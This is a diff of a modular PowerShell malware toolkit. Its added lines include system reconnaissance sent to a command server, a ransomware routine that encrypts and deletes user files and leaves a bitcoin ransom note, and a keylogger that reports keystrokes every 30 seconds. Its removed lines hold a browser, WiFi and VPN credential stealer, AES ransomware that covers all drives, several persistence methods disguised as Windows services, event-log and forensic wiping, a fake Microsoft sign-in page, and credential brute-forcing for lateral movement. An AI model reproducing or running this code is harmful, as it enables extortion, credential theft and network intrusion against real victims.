+    $info["Architecture"] = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+    $info["CPU"] = (Get-WmiObject Win32_Processor).Name
+    $info["RAM_GB"] = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    $info["IP"] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
+    $info["MAC"] = (Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object -First 1).MacAddress
+    $info["IsAdmin"] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    $info["Antivirus"] = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct 2>$null).displayName -join ", "
+    $info["Processes"] = (Get-Process | Select-Object -First 30 Name, CPU, WorkingSet | ConvertTo-Json -Compress)
+    
+    Send-ExfilData -Type "system" -Data $info
+    return ($info | ConvertTo-Json -Compress)
+}
+
+function Invoke-Ransomware {
+    param($cmd)
+    
+    # Generate encryption key
+    $key = [Convert]::ToBase64String([byte[]]::new(32))
+    $Script:RansomwareKey = $key
+    
+    $targetDirs = @(
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Pictures",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\Videos"
+    )
+    
+    $extensions = @(".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".zip", ".rar", ".7z", ".sql", ".db", ".mdb", ".accdb", ".mp3", ".mp4", ".avi", ".mkv", ".php", ".html", ".css", ".js")
+    
+    $encrypted = 0
+    $ransomNote = @"
+===============================================
+        YOUR FILES HAVE BEEN ENCRYPTED
+===============================================
+
+All your important documents, pictures, and files
+have been encrypted with AES-256 encryption.
+
+To recover your files, you must pay 0.1 BTC to
+the following address:
+
+  bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+After payment, contact us with your session ID:
+  $($Script:SessionId)
+
+DO NOT attempt to decrypt files yourself.
+DO NOT use third-party recovery tools.
+You will lose your data permanently.
+
+Session ID: $($Script:SessionId)
+===============================================
+"@
+    
+    foreach ($dir in $targetDirs) {
+        if (Test-Path $dir) {
+            $files = Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | 
+            Where-Object { $_.Extension -in $extensions }
+            
+            foreach ($file in $files) {
+                try {
+                    $content = [System.IO.File]::ReadAllBytes($file.FullName)
+                    
+                    # Simple XOR "encryption" for demo (replace with proper AES in production)
+                    $encryptedContent = $content | ForEach-Object { $_ -bxor 0xAB }
+                    
+                    $encryptedPath = "$($file.FullName).kaoskaki"
+                    [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedContent)
+                    Remove-Item $file.FullName -Force
+                    
+                    $Script:EncryptedFiles += @{
+                        original  = $file.FullName
+                        encrypted = $encryptedPath
+                    }
+                    $encrypted++
+                }
+                catch {
+                    Write-Host "[!] Failed to encrypt: $($file.FullName)" -ForegroundColor Red
+                }
+            }
+        }
+    }
+    
+    # Drop ransom note on desktop
+    $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
+    [System.IO.File]::WriteAllText($notePath, $ransomNote)
+    
+    # Report
+    $result = @{
+        encrypted_count = $encrypted
+        directories     = $targetDirs
+        key             = "[REDACTED]"
+        ransom_note     = $notePath
+        session_id      = $Script:SessionId
+    }
+    
+    Send-ExfilData -Type "ransomware" -Data $result
+    return "Encrypted $encrypted files. Ransom note dropped."
+}
+
+function Invoke-Keylogger {
+    param($cmd)
+    
+    if ($Script:KeyloggerRunning) {
+        return "Keylogger already running"
+    }
+    
+    $Script:KeyloggerRunning = $true
+    $logPath = "$env:TEMP\kb_$($Script:SessionId).log"
+    
+    # Start keylogger in background job
+    $Script:KeyloggerJob = Start-Job -ScriptBlock {
+        param($sessionId, $c2Server, $logPath)
+        
+        $logFile = $logPath
+        # $keys = ""
+        $lastSend = Get-Date
+        
+        $source = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Text;
+using System.IO;
+
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+    
+    public static string GetActiveWindowTitle() {
+        const int nChars = 256;
+        StringBuilder Buff = new StringBuilder(nChars);
+        IntPtr handle = GetForegroundWindow();
+        if (GetWindowText(handle, Buff, nChars) > 0) {
+            return Buff.ToString();
+        }
+        return "";
+    }
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+    
+    [DllImport("user32.dll")]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+}
+"@
+        
+        try {
+            Add-Type -TypeDefinition $source -Language CSharp
+        }
+        catch {}
+        
+        $lastWindow = ""
+        $buffer = ""
+        
+        while ($true) {
+            Start-Sleep -Milliseconds 50
+            
+            for ($i = 8; $i -le 190; $i++) {
+                $state = [KeyLogger]::GetAsyncKeyState($i)
+                if ($state -eq -32767 -or $state -eq 1) {
+                    $key = [char]$i
+                    if ($i -ge 16 -and $i -le 17) { continue }  # Skip shift/ctrl
+                    
+                    $windowTitle = [KeyLogger]::GetActiveWindowTitle()
+                    if ($windowTitle -ne $lastWindow) {
+                        $buffer += "[ Window: $windowTitle ]`n"
+                        $lastWindow = $windowTitle
+                    }
+                    
+                    # Map special keys
+                    switch ($i) {
+                        8 { $key = "[BACKSPACE]" }
+                        9 { $key = "[TAB]" }
+                        13 { $key = "[ENTER]`n" }
+                        20 { $key = "[CAPSLOCK]" }
+                        27 { $key = "[ESC]" }
+                        32 { $key = " " }
+                        46 { $key = "[DELETE]" }
+                    }
+                    
+                    $buffer += $key
+                    
+                    # Write to log file
                     try {
-                        # Get master password from key4.db
-                        $keyBytes = [IO.File]::ReadAllBytes($keyDb)
-                        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                            $keyBytes[($keyBytes.Length - 48)..($keyBytes.Length - 1)], 
-                            $null, 
-                            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                        )
-                        [void]$masterKey
-                        
-                        $ffData = Get-Content $loginsFile -Raw | ConvertFrom-Json
-                        foreach ($login in $ffData.logins) {
-                            if ($login.encryptedUsername -and $login.encryptedPassword) {
-                                $uBytes = [Convert]::FromBase64String($login.encryptedUsername)
-                                $pBytes = [Convert]::FromBase64String($login.encryptedPassword)
-                                [void]$uBytes; [void]$pBytes
-                                # Decrypt with 3DES using masterKey (simplified)
-                                $creds += @{source = "Firefox"; url = $login.hostname; username = "[DECRYPT]"; password = "[DECRYPT]" }
-                            }
-                        }
+                        [System.IO.File]::AppendAllText($logFile, $key)
                     }
                     catch {}
                 }
             }
-        }
-    }
-    
-    if ($creds.Count -gt 0) {
-        Invoke-C2 credentials $creds
-        Write-Log "[BROWSER] Sent $($creds.Count) credentials"
-    }
-}
-
-# ========== MODULE 7: WIFI STEALER ==========
-function Invoke-WiFiStealer {
-    Write-Log "[WIFI] Stealing WiFi profiles..."
-  
-    $profiles = @()
-  
-    try {
-        $raw = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace '.*:\s+', '' }
-    
-        foreach ($wifiProfile in $raw) {
-            try {
-                $details = netsh wlan show profile name="$wifiProfile" key=clear | Out-String
-                $password = if ($details -match "Key Content\s+:\s+(.+)") { $matches[1] } else { "[NO PASSWORD]" }
-                $auth = if ($details -match "Authentication\s+:\s+(.+)") { $matches[1] } else { "?" }
-                $cipher = if ($details -match "Cipher\s+:\s+(.+)") { $matches[1] } else { "?" }
-        
-                $profiles += @{ssid = $wifiProfile; password = $password; auth = $auth; cipher = $cipher }
-            }
-            catch { Write-Log "[WIFI] Error on $($wifiProfile): $_" }
-        }
-    }
-    catch { Write-Log "[WIFI] Error listing profiles: $_" }
-  
-    if ($profiles.Count -gt 0) {
-        Invoke-C2 -type 'wifi' -data $profiles
-        Write-Log "[WIFI] Sent $($profiles.Count) WiFi profiles to C2"
-    }
-}
-
-# ========== MODULE 8: VPN STEALER ==========
-function Invoke-VpnStealer {
-    Write-Log "[VPN] Stealing VPN configurations..."
-
-    $vpnData = @{}
-  
-    # OpenVPN
-    $ovpnDirs = @("$env:USERPROFILE\OpenVPN\config", "$env:PROGRAMDATA\OpenVPN\config", "$env:LOCALAPPDATA\OpenVPN\config")
-    foreach ($dir in $ovpnDirs) {
-        if (Test-Path $dir) {
-            $files = Get-ChildItem "$dir\*.ovpn" -ErrorAction SilentlyContinue
-            foreach ($file in $files) {
-                $vpnData["openvpn_$($file.BaseName)"] = Get-Content $file.FullName -Raw
-            }
-        }
-    }
-  
-    # WireGuard
-    $wgDir = "$env:PROGRAMDATA\WireGuard\Configurations"
-    if (Test-Path $wgDir) {
-        $files = Get-ChildItem "$wgDir\*.conf" -ErrorAction SilentlyContinue
-        foreach ($file in $files) {
-            $vpnData["wireguard_$($file.BaseName)"] = Get-Content $file.FullName -Raw
-        }
-    }
-  
-    # Windows VPN connections
-    $vpnConnections = Get-VpnConnection -ErrorAction SilentlyContinue
-    foreach ($conn in $vpnConnections) {
-        $vpnData["windows_vpn_$($conn.Name)"] = @{
-            name     = $conn.Name
-            server   = $conn.ServerAddress
-            type     = $conn.TunnelType
-            auth     = $conn.AuthenticationMethod
-            remember = $conn.RememberCredential
-        }
-    }
-  
-    $vpnCreds = @()
-    # Try to get stored VPN credentials from Credential Manager
-    try {
-        $vaultCmd = cmdkey /list 2>$null
-        $vpnCreds += @{vault = $vaultCmd }
-    }
-    catch {}
-  
-    if ($vpnData.Count -gt 0) {
-        Invoke-C2 -type 'credentials' -data @{type = 'vpn'; data = $vpnData }
-        Write-Log "[VPN] Sent $($vpnData.Count) VPN configs to C2"
-    }
-}
-
-# ========== RANSOMWARE — FIXED (All drives + Recovery) ==========
-function Invoke-Ransomware {
-    Write-Log "[RANSOMWARE] Starting encryption..."
-    
-    # VSS + Recovery + Task Manager (sama seperti sebelumnya)
-    # ... [keep existing VSS delete code] ...
-    
-    # AES Key Generation
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.KeySize = 256; $aes.GenerateKey(); $aes.GenerateIV()
-    $aesKey = $aes.Key; $aesIV = $aes.IV
-    
-    # Send AES keys to C2
-    $encryptedAesKey = [Convert]::ToBase64String($aesKey)
-    $encryptedAesIV = [Convert]::ToBase64String($aesIV)
-    Invoke-C2 decrypt_key @{encrypted_key = $encryptedAesKey; encrypted_iv = $encryptedAesIV }
-    
-    # === FIX: Collect ALL drives ===
-    $targetDirs = @()
-    # All fixed drives
-    Get-WmiObject Win32_LogicalDisk -EA 0 | Where-Object { $_.DriveType -eq 3 } | ForEach-Object { $targetDirs += "$($_.DeviceID)\" }
-    # Removable drives
-    Get-WmiObject Win32_LogicalDisk -EA 0 | Where-Object { $_.DriveType -eq 2 } | ForEach-Object { $targetDirs += "$($_.DeviceID)\" }
-    # Network shares
-    Get-SmbShare -EA 0 | ForEach-Object { $targetDirs += $_.Path }
-    # User profile dirs
-    $userDirs = @("Documents", "Desktop", "Downloads", "Pictures", "Videos", "Music", "Contacts", "Favorites", "Links", "OneDrive")
-    foreach ($d in $userDirs) { $path = "$env:USERPROFILE\$d"; if (Test-Path $path) { $targetDirs += $path } }
-    # Common server dirs
-    $serverDirs = @("C:\inetpub", "C:\xampp\htdocs", "C:\wamp64\www", "D:\inetpub", "E:\inetpub")
-    foreach ($d in $serverDirs) { if (Test-Path $d) { $targetDirs += $d } }
-    
-    $extensions = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.csv', '.rtf',
-        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.raw',
-        '.mp3', '.mp4', '.wav', '.avi', '.mkv', '.mov', '.flv', '.wmv',
-        '.zip', '.rar', '.7z', '.tar', '.gz', '.iso',
-        '.sql', '.mdb', '.db', '.dbf', '.mdf', '.ldf',
-        '.php', '.asp', '.aspx', '.jsp', '.py', '.rb', '.js', '.ts', '.html', '.css',
-        '.pem', '.key', '.p12', '.pfx', '.ovpn', '.conf', '.rdp',
-        '.eml', '.msg', '.pst', '.ost',
-        '.dwg', '.dxf', '.psd', '.ai', '.indd', '.fla',
-        '.bak', '.old', '.backup', '.vhd', '.vhdx', '.vmdk', '.ova', '.ovf')
-    
-    # === FIX: Error Recovery — Backup headers ===
-    $backupDir = "$env:TEMP\ransim_backup"
-    if (!(Test-Path $backupDir)) { New-Item $backupDir -ItemType Directory -Force -Hidden | Out-Null }
-    $backupFile = "$backupDir\headers_$(Get-Date -Format yyyyMMddHHmmss).bin"
-    $backupStream = [IO.File]::OpenWrite($backupFile)
-    $backupWriter = New-Object System.IO.BinaryWriter($backupStream)
-    
-    $allFiles = @()
-    foreach ($dir in $targetDirs) {
-        if (Test-Path $dir) {
-            try {
-                $files = Get-ChildItem $dir -Recurse -File -EA 0 | 
-                Where-Object { $extensions -contains $_.Extension.ToLower() -and $_.Length -lt 50MB -and $_.Length -gt 10 }
-                $allFiles += $files
-            }
-            catch {}
-        }
-    }
-    
-    Write-Log "[RANSOMWARE] Found $($allFiles.Count) files to encrypt"
-    
-    # === FIX: Save first 512 bytes of each file for recovery ===
-    foreach ($file in $allFiles) {
-        try {
-            $header = [byte[]]::new(512)
-            $fs = [IO.File]::OpenRead($file.FullName)
-            $fs.Read($header, 0, 512) | Out-Null
-            $fs.Close()
             
-            $backupWriter.Write([int]0)  # Placeholder for length
-            $backupWriter.Write($header)
-        }
-        catch {}
-    }
-    $backupWriter.Close()
-    $backupStream.Close()
-    
-    # === FIX: Multi-threaded encryption with progress ===
-    $encryptedCount = 0
-    $failedFiles = @()
-    
-    $results = $allFiles | ForEach-Object {
-        $file = $_
-        
-        try {
-            $content = [IO.File]::ReadAllBytes($file.FullName)
-            if ($content.Length -eq 0) { return }
-            
-            $aes = [Security.Cryptography.Aes]::Create()
-            $aes.Key = $aesKey; $aes.IV = $aesIV
-            $encryptor = $aes.CreateEncryptor()
-            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
-            
-            [IO.File]::WriteAllBytes($file.FullName + ".ransim", $encrypted)
-            Remove-Item $file.FullName -Force
-            
-            @{ status = 'success'; file = $file.FullName }
-        }
-        catch {
-            @{ status = 'error'; file = $file.FullName }
-        }
-    }
-    
-    $successes = @($results | Where-Object { $_.status -eq 'success' })
-    if ($successes) { $encryptedCount = $successes.Count }
-    $failedFiles = @($results | Where-Object { $_.status -eq 'error' } | Select-Object -ExpandProperty file)
-    
-    # === FIX: If too many failures, rollback ===
-    if ($failedFiles.Count -gt $allFiles.Count * 0.5) {
-        Write-Log "[RANSOMWARE] Critical failure rate! Rolling back..."
-        # Delete partial encrypted files
-        foreach ($file in $allFiles) {
-            $encPath = $file.FullName + ".ransim"
-            if (Test-Path $encPath) { Remove-Item $encPath -Force -EA 0 }
-        }
-        Invoke-C2 ransomware_status @{status = 'rollback'; error = 'high_failure_rate'; files_encrypted = 0 }
-        return
-    }
-    
-    # Ransom note (sama seperti sebelumnya)
-    $note = "..."
-    foreach ($dir in $targetDirs) { if (Test-Path $dir) { $note | Out-File "$dir\RANSOM_NOTE.txt" -Encoding ascii -EA 0 } }
-    
-    # === FIX: Hide backup file ===
-    Set-ItemProperty $backupDir -Name Attributes -Value 'Hidden' -EA 0
-    
-    Write-Log "[RANSOMWARE] Encrypted $encryptedCount files"
-    Invoke-C2 ransomware_status @{files_encrypted = $encryptedCount; session = $SESSION_ID; backup_file = $backupFile }
-}
-
-# ========== MODULE 10: PERSISTENCE ENGINE ==========
-function Invoke-Persistence {
-    Write-Log "[PERSISTENCE] Installing persistence mechanisms..."
-  
-    $psPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
-    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ransim.lnk"
-  
-    # 10.1 Run Key
-    try {
-        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value $psPath -PropertyType String -Force -ErrorAction SilentlyContinue
-        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value $psPath -PropertyType String -Force -ErrorAction SilentlyContinue
-        Write-Log "[PERSISTENCE] Run Key added"
-    }
-    catch {}
-  
-    # 10.2 Scheduled Task (with trigger on startup + every hour)
-    try {
-        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
-        $triggers = @(
-            New-ScheduledTaskTrigger -AtStartup
-            New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1).ToString('HH:mm') -RepetitionInterval (New-TimeSpan -Hours 1)
-        )
-        Register-ScheduledTask -TaskName 'MicrosoftWindowsUpdateCheck' -Action $action -Trigger $triggers -RunLevel Highest -Force -ErrorAction SilentlyContinue
-        Write-Log "[PERSISTENCE] Scheduled Task created"
-    }
-    catch {}
-  
-    # 10.3 Startup Folder Shortcut
-    try {
-        $WScriptShell = New-Object -ComObject WScript.Shell
-        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = 'powershell.exe'
-        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
-        $shortcut.WindowStyle = 7
-        $shortcut.Save()
-        Write-Log "[PERSISTENCE] Startup shortcut created"
-    }
-    catch {}
-  
-    # 10.4 WMI Event Subscription (permanent)
-    try {
-        $filterName = 'WindowsHealthFilter'
-        $consumerName = 'WindowsHealthConsumer'
-    
-        # Remove existing if any
-        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-        Get-WmiObject -Namespace root\subscription -Class __EventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $filterName } | Remove-WmiObject -ErrorAction SilentlyContinue
-    
-        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-            Name           = $filterName
-            EventNamespace = 'root\cimv2'
-            QueryLanguage  = 'WQL'
-            Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-        } -ErrorAction SilentlyContinue
-    
-        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-            Name                = $consumerName
-            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
-            RunInteractively    = $false
-        } -ErrorAction SilentlyContinue
-    
-        if ($filter -and $consumer) {
-            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
-                Filter   = $filter
-                Consumer = $consumer
-            } -ErrorAction SilentlyContinue
-            Write-Log "[PERSISTENCE] WMI Event Subscription created"
-        }
-    }
-    catch {}
-  
-    # 10.5 Service Persistence
-    try {
-        $serviceName = 'WindowsHealthService'
-        $binaryPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
-        New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName 'Windows Health Service' -Description 'Monitors system health and performance' -StartupType Automatic -ErrorAction SilentlyContinue
-        Start-Service $serviceName -ErrorAction SilentlyContinue
-        Write-Log "[PERSISTENCE] Service created"
-    }
-    catch {}
-  
-    # 10.6 Copy script to hidden location
-    try {
-        $hiddenDir = "$env:APPDATA\Microsoft\Windows\UpdateCache"
-        if (!(Test-Path $hiddenDir)) { New-Item -Path $hiddenDir -ItemType Directory -Force -Hidden | Out-Null }
-        Copy-Item $PSCommandPath "$hiddenDir\update.ps1" -Force
-        Set-ItemProperty "$hiddenDir" -Name Attributes -Value 'Hidden'
-        Write-Log "[PERSISTENCE] Script copied to hidden location"
-    }
-    catch {}
-  
-    Write-Log "[PERSISTENCE] All persistence mechanisms installed"
-}
-
-# ========== MODULE 11: LOG CLEANER ==========
-function Invoke-LogCleaner {
-    Write-Log "[CLEANER] Cleaning forensic traces..."
-  
-    # 11.1 Clear PowerShell History
-    try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    catch {}
-  
-    # 11.2 Clear Event Logs
-    try {
-        $logs = @('Security', 'System', 'Application', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-TaskScheduler/Operational')
-        foreach ($log in $logs) {
-            try {
-                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
-                wevtutil cl $log 2>$null
-            }
-            catch {}
-        }
-        Write-Log "[CLEANER] Event logs cleared"
-    }
-    catch {}
-  
-    # 11.3 Delete Prefetch
-    try {
-        Remove-Item "C:\Windows\Prefetch\*" -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Log "[CLEANER] Prefetch cleared"
-    }
-    catch {}
-  
-    # 11.4 Clear Temp Files
-    try {
-        $tempPaths = @("$env:TEMP\*", "$env:WINDIR\Temp\*", "$env:USERPROFILE\AppData\Local\Temp\*")
-        foreach ($path in $tempPaths) {
-            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
-        }
-        Write-Log "[CLEANER] Temp files cleared"
-    }
-    catch {}
-  
-    # 11.5 Clear USN Journal (if admin)
-    try {
-        fsutil usn deletejournal /d C: 2>$null
-        Write-Log "[CLEANER] USN Journal cleared"
-    }
-    catch {}
-  
-    # 11.6 Clear Clipboard
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        [System.Windows.Forms.Clipboard]::Clear()
-        Write-Log "[CLEANER] Clipboard cleared"
-    }
-    catch {}
-  
-    # 11.7 Clear Recent Documents
-    try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Log "[CLEANER] Recent documents cleared"
-    }
-    catch {}
-  
-    # 11.8 Clear Jump Lists
-    try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Log "[CLEANER] Jump lists cleared"
-    }
-    catch {}
-  
-    # 11.9 Clear DNS Cache
-    try {
-        ipconfig /flushdns 2>$null
-        Write-Log "[CLEANER] DNS cache flushed"
-    }
-    catch {}
-  
-    Write-Log "[CLEANER] Forensic cleanup complete"
-}
-
-# ========== MODULE 12: PHISHING ENGINE ==========
-function Invoke-Phishing {
-    Write-Log "[PHISHING] Starting phishing server..."
-  
-    $phishingHtml = @'
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Microsoft Sign In</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .login-container { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; width: 360px; text-align: center; }
-    .logo { margin-bottom: 20px; }
-    .logo svg { width: 120px; }
-    h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1b1b1b; }
-    p { color: #666; font-size: 14px; margin-bottom: 20px; }
-    input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; margin-bottom: 15px; outline: none; }
-    input:focus { border-color: #0067b8; }
-    button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 600; }
-    button:hover { background: #005da6; }
-    .error { color: #e81123; font-size: 12px; margin-top: 10px; display: none; }
-    .footer { margin-top: 20px; font-size: 12px; color: #999; }
-    .footer a { color: #0067b8; text-decoration: none; }
-  </style>
-</head>
-<body>
-  <div class="login-container">
-    <div class="logo">
-      <svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
-    </div>
-    <h1>Sign in</h1>
-    <p>to continue to Microsoft services</p>
-    <form id="loginForm" action="/api/exfil" method="POST">
-      <input type="hidden" name="type" value="phishing">
-      <input type="hidden" name="session_id" value="' + $SESSION_ID + '">
-      <input type="email" name="username" placeholder="Email, phone, or Skype" required>
-      <input type="password" name="password" placeholder="Password" required>
-      <button type="submit">Sign in</button>
-      <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
-    </form>
-    <div class="footer">
-      <a href="#">Forgot password?</a> | <a href="#">Create account</a>
-    </div>
-  </div>
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const formData = new FormData(this);
-      const data = {};
-      formData.forEach((v, k) => data[k] = v);
-      
-      try {
-        await fetch('/api/exfil', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify(data)
-        });
-        document.getElementById('errorMsg').style.display = 'block';
-      } catch(e) {
-        document.getElementById('errorMsg').style.display = 'block';
-      }
-    });
-  </script>
-</body>
-</html>
-'@
-  
-    # Write HTML to temp
-    $htmlPath = "$env:TEMP\mslogin.html"
-    $phishingHtml | Out-File $htmlPath -Encoding utf8
-  
-    # Start local HTTP listener on port 8080
-    $httpListener = New-Object System.Net.HttpListener
-    $httpListener.Prefixes.Add('http://+:8080/')
-    $httpListener.Start()
-    Write-Log "[PHISHING] HTTP listener started on port 8080"
-  
-    while ($true) {
-        try {
-            $context = $httpListener.GetContext()
-            $request = $context.Request
-            $response = $context.Response
-      
-            if ($request.HttpMethod -eq 'GET') {
-                # Serve phishing page
-                $content = [System.Text.Encoding]::UTF8.GetBytes($phishingHtml)
-                $response.ContentType = 'text/html; charset=utf-8'
-                $response.OutputStream.Write($content, 0, $content.Length)
-            }
-      
-            $response.Close()
-        }
-        catch { Write-Log "[PHISHING] Error: $_" }
-    }
-}
-
-# ========== MODULE 13: LATERAL MOVEMENT ==========
-function Invoke-LateralMovement {
-    Write-Log "[LATERAL] Scanning for lateral movement targets..."
-  
-    # 13.1 Discover network targets
-    $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq 'Dhcp' -or $_.PrefixOrigin -eq 'Manual' } | Select-Object -First 1).IPAddress
-    if ($subnet) {
-        $prefix = $subnet.Substring(0, $subnet.LastIndexOf('.'))
-        $targets = @()
-        1..254 | ForEach-Object -Parallel {
-            $ip = "$($using:prefix).$_"
-            try {
-                if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeToLive 128 -ErrorAction SilentlyContinue) {
-                    $ip
-                }
-            }
-            catch {}
-        } -ThrottleLimit 50 | ForEach-Object { $targets += $_ }
-    
-        Write-Log "[LATERAL] Found $($targets.Count) live hosts"
-    
-        $scriptPath = $PSCommandPath
-    
-        # 13.2 Try common credentials
-        $commonCreds = @(
-            @{user = 'Administrator'; pass = 'admin' },
-            @{user = 'Administrator'; pass = 'password' },
-            @{user = 'Administrator'; pass = '123456' },
-            @{user = 'Administrator'; pass = 'P@ssw0rd' },
-            @{user = 'admin'; pass = 'admin' },
-            @{user = 'admin'; pass = 'password' },
-            @{user = 'admin'; pass = 'P@ssw0rd' },
-            @{user = 'Administrator'; pass = 'Welcome1' },
-            @{user = 'Administrator'; pass = 'Welcome123' },
-            @{user = 'Administrator'; pass = 'letmein' }
-        )
-    
-        foreach ($target in $targets) {
-            foreach ($cred in $commonCreds) {
+            # Send every 30 seconds
+            if ((Get-Date) - $lastSend -gt [TimeSpan]::FromSeconds(30) -and $buffer.Length -gt 0) {
                 try {
-                    $secpass = ConvertTo-SecureString $cred.pass -AsPlainText -Force
-                    $credObj = New-Object System.Management.Automation.PSCredential($cred.user, $secpass)
-          
-                    # Test WMI connection
-                    $wmiTest = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $target -Credential $credObj -ErrorAction SilentlyContinue
-                    if ($wmiTest) {
-                        Write-Log "[LATERAL] Connected to $target with $($cred.user):$($cred.pass)"
-            
-                        # Copy payload via admin share
-                        $destination = "\\$target\admin$\Temp\update.ps1"
-                        Copy-Item $scriptPath $destination -Force -ErrorAction SilentlyContinue
-            
-                        # Execute via WMI
-                        $wmiProcess = Invoke-WmiMethod -Class Win32_Process -ComputerName $target -Credential $credObj -Name Create -ArgumentList "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 -Full" -ErrorAction SilentlyContinue
-                        [void]$wmiProcess
-            
-                        # Execute via Scheduled Task
-                        $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 -Full"
-                        $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
-                        $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
